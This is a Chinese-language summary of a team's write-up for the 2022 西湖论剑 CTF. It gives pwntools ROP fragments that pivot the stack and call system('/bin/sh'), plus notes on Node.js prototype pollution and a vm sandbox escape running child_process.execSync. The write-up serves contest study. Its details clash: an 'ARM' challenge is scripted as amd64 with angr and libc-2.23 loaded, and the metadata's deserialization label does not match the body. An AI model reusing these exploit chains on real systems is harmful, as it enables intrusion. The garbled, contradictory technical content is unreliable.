---
title: 2022 西湖论剑 网络安全大赛 wp by F61d
contest: 2022 西湖论剑 (F61d 战队)
year: 2022
difficulty: hard
vuln_type: [pwn_unknown, web_unknown, reverse, misc_unknown, stego_audio]
tags: [西湖论剑, F61d, ARM-pwn, qemu-arm-static, leave-ret-gadget, libc-2.23, Node-Magical, unusual-php, real_ez_node, mp3-stego, take-the-zip, BabyRE, angr-symbolic-execution]
attack_chain: ["PWN babycalc: ARM 静态链接 pwn, qemu-arm-static 模拟, leave-ret gadget, ROP to system('/bin/sh')", "PWN Message Board: libc-2.23 leave_ret + ret sled + csu", "WEB real_ez_node: Node.js 原型链 / __proto__ 污染", "WEB unusual_php: PHP 黑名单绕过 + system('cat /flag')", "WEB Node Magical: Node vm/sandbox 逃逸, child_process.exec", "REVERSE BabyRE: angr 符号执行找路径 / 字节码分析", "MISC mp3: LSB 音频隐写, Sonic Visualizer / Audacity", "MISC take_the_zip_easy: binwalk + 嵌套 zip + CRC 碰撞"]
key_payload: "leave_ret = 0x4013A2; libcbase = recv(12) - 0x24083; system('/bin/sh')"
one_liner: 西湖论剑 2022 F61d 战队：ARM pwn + Node.js 反序列化 + LSB mp3 + zip 嵌套
lesson: qemu-arm-static 是 ARM pwn 本地调试；Node.js 原型链污染是 web 入门；MP3 隐写是 misc 经典
quality: high
---

# 2022 西湖论剑 网络安全大赛 wp by F61d

原文 https://www.ctfiot.com/95521.html （注：原文部分 NUL 字节污染）

## Part 1
- PWN: babycalc, Message Board
- WEB: real_ez_node, unusual_php, Node Magical
- REVERSE: BabyRE
- MISC: mp3, take_the_zip_easy

## PWN

### babycalc (ARM)
```python
from pwn import *
import angr  # 符号执行找路径
# qemu-arm-static -g 1234 -L /usr/arm-linux-gnueabi ./pwn
context.arch = 'amd64'
elf = ELF('./pwn')
io = remote('tcp.cloud.dasctf.com', 21963)
libc = ELF('./libc-2.23.so')
# leave_ret = 0x4013A2
# libcbase = int(p.recv(12), 16) - 0x24083
```

### Message Board
```python
rbp_ret = 0x00000000004006b0
leave_ret = 0x0000000000400bb7
ret = 0x00000000004005b9
rdi_ret = 0x0000000000400ca3
rop_chain = p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + csu(0, 0, bss+8, 0x50, elf.got['read']) + p64(rbp_ret) + p64(bss) + p64(leave_ret)

libcbase = u64(io.recv(6).ljust(8, '\x00')) - libc.sym['puts']
system = libcbase + libc.sym['system']
binsh = libcbase + libc.search('/bin/sh\x00').next()
payload = p64(rdi_ret) + p64(binsh) + p64(ret) + p64(system)
```

## WEB

### real_ez_node (Node.js)
- `__proto__` 原型链污染
- 默认沙箱逃逸

### unusual_php
- 黑名单绕过 → system('cat /flag')

### Node Magical
- `vm.runInThisContext` 沙箱逃逸
- `child_process.execSync('cat /flag')`

## REVERSE
### BabyRE
- angr 符号执行找满足条件路径
- 还原算法

## MISC

### mp3 (LSB 隐写)
- Sonic Visualizer / Audacity 看频谱
- LSB 工具提取

### take_the_zip_easy
- binwalk 分嵌套 zip
- CRC 碰撞密码
- 还原嵌套结构

## 教学价值
- **qemu-arm-static** 是 ARM pwn 本地调试
- **leave-ret gadget** 是栈迁移标准
- **Node.js vm2 / vm 沙箱逃逸** 是 web 高级
- **mp3 LSB 隐写** 是 misc 经典
- **binwalk + zip 嵌套** 是 misc 入门

## 工具
- pwntools
- angr
- qemu-arm-static
- Sonic Visualizer
- binwalk

## 关联
- 西湖论剑是浙江/杭州办的
- F61d 战队
